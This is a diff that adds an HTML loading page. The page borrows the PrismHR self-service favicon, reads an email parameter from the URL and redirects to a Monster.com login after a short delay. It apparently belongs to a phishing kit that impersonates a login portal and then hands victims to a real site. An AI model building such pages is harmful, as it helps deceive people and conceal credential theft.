@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <link rel="icon" href="https://ess.prismhr.com/ess/auth/favicon.ico" type="image/x-icon">
+    <style>
+        /* Basic styling for the loading page */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Verdana', sans-serif; /* Match font with index.html */
+            background-color: #f4f4f4; /* Match background color with index.html */
+        }
+        .loading-container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Add shadow for consistency */
+        }
+        .spinner {
+            border: 4px solid #f3f3f3; /* Light grey */
+            border-top: 4px solid #4CAF50; /* Green, matching index.html */
+            border-radius: 50%;
+            width: 60px; /* Consistent size with other UI elements */
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            margin-top: 20px;
+            color: #333;
+            font-family: Arial;
+            font-size: 16px; /* Increased font size */
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <p>Please wait while we complete your request...</p>
+    </div>
+    <script>
+        // Function to get the query parameter by name
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Get the email from the query parameter
+        const email = getQueryParam('email');
+
+        // Redirect to https://identity.monster.com/oneiam/Account/Login?ReturnUrl=%2Foneiam%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3DOC53F0037FFA16D7%26redirect_uri%3Dhttps%253A%252F%252Fwww.monster.com%252Fprofile%252Fauth%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520email%2520offline_access%26state%3D5ursenfa~login~eyJfciI6Ii9wcm9maWxlL3ZhbGlkLXByb2ZpbGUtY29udGludWU_cmVkaXJlY3RVcmk9JTJGcHJvZmlsZSUyRmRhc2hib2FyZCUzRmZyb20lM0Rob21lcGFnZSIsIl9zIjp7Imxhbmd1YWdlVGFnIjoiZW4tVVMifX0%26monsterProps%3DeyJsYW5ndWFnZVRhZyI6ImVuLVVTIiwicmVjb2duaXplZFVzZXIiOmZhbHNlLCJtb2RlIjoiTG9naW4iLCJyZWRpcmVjdFVyaSI6Ii9wcm9maWxlL2Rhc2hib2FyZD9mcm9tPWhvbWVwYWdlIiwic2lnblVwRmxvdyI6Ik9OQk9BUkRJTkciLCJpc0dvb2dsZU9uZVRhcCI6ZmFsc2UsImRldmljZUlkIjoiN2UwNTFlMjYtOTQ1ZC00MzExLTg5NjctOTVhODE4MzAzMGExIn0%26acr_values%3Dtenant%253A23642029-2c6a-4b20-8bff-5b7d2d188ddb%2520site%253Ab8041578-a567-4979-ad98-76a0e8fc0b87%26culture%3Den-US after 3 seconds
+        setTimeout(() => {
+            window.location.href = 'https://identity.monster.com/oneiam/Account/Login?ReturnUrl=%2Foneiam%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3DOC53F0037FFA16D7%26redirect_uri%3Dhttps%253A%252F%252Fwww.monster.com%252Fprofile%252Fauth%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520email%2520offline_access%26state%3D5ursenfa~login~eyJfciI6Ii9wcm9maWxlL3ZhbGlkLXByb2ZpbGUtY29udGludWU_cmVkaXJlY3RVcmk9JTJGcHJvZmlsZSUyRmRhc2hib2FyZCUzRmZyb20lM0Rob21lcGFnZSIsIl9zIjp7Imxhbmd1YWdlVGFnIjoiZW4tVVMifX0%26monsterProps%3DeyJsYW5ndWFnZVRhZyI6ImVuLVVTIiwicmVjb2duaXplZFVzZXIiOmZhbHNlLCJtb2RlIjoiTG9naW4iLCJyZWRpcmVjdFVyaSI6Ii9wcm9maWxlL2Rhc2hib2FyZD9mcm9tPWhvbWVwYWdlIiwic2lnblVwRmxvdyI6Ik9OQk9BUkRJTkciLCJpc0dvb2dsZU9uZVRhcCI6ZmFsc2UsImRldmljZUlkIjoiN2UwNTFlMjYtOTQ1ZC00MzExLTg5NjctOTVhODE4MzAzMGExIn0%26acr_values%3Dtenant%253A23642029-2c6a-4b20-8bff-5b7d2d188ddb%2520site%253Ab8041578-a567-4979-ad98-76a0e8fc0b87%26culture%3Den-US';
+        }, 3500); // Adjusted delay to 3 seconds
+    </script>
+</body>
+</html>
